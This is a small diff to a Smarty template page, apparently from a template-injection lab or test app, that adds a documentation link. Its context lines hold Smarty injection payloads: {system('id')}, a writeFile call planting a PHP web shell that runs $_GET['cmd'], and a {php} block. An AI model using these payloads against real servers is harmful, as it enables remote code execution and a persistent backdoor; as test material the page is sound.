@@ -20,5 +20,9 @@ RCE: {system('id')}<br>
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 {php}echo `id`;{/php}<br>
 *}
+
+<p>
+<a href="https://www.smarty.net/docs/en/language.function.include.tpl">Include files</a>
+</p>
   </body>
 </html>
